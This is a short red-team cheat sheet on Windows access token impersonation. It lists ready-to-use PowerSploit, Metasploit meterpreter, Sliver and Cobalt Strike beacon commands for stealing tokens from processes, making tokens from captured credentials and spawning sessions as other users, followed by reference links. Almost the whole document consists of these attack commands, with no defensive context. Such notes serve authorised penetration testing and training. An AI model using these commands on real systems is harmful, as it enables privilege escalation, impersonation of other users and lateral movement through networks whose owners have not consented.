# Token Impersonation

## 01 - Powersploit

TODO: Write more information related to this powersploit module

`PS C:\> Invoke-TokenManipulation -Enumerate`

`PS C:\> Invoke-TokenManipulation -ImpersonateUser -UserName "<domain_name>\<username>"`

## 02 - Metasploit

- Steal Token

```
meterpreter > steal_token <pid>

meterpreter > getuid

meterpreter > getpid

meterpreter > drop_token
```

- Make Token

```
meterpreter > run post/windows/manage/make_token domain=<domain_name> username=<username> password=<password>

meterpreter > getuid

meterpreter > getprivs

meterpreter > rev2self
```

## 03 - Sliver

- Make Token

```
sliver (IMPLANT_NAME) > make-token -u <username> -d . -p <password>

sliver (IMPLANT_NAME) > execute -T -o <commands>
```

## 04 - Cobalt Strike

- Steal Token

```
beacon> steal_token <pid>

beacon> getuid

beacon> getprivs

beacon> rev2self
```

- Make Token

```
beacon> make_token <domain_name>\<username> <password>

beacon> getuid

beacon> getprivs

beacon> rev2self
```

- SpawnAs

```
beacon> spawnas <domain_name>\<username> <password>

beacon> getuid
```


---
## References

- [Token Stealing and Incognito](https://pentestlab.blog/2012/08/07/token-stealing-and-incognito/)

- [Demystifying Cobalt Strike’s “make_token” Command](https://research.nccgroup.com/2023/11/10/demystifying-cobalt-strikes-make_token-command/)

- [DMCXBlue Gitbook: Privilege Escalation Access Token Manipulation](https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation)

- [Exploit DB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)

- [Helpsystems: Cobalt Strike Privilege Escalation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_privilege-escalation.htm)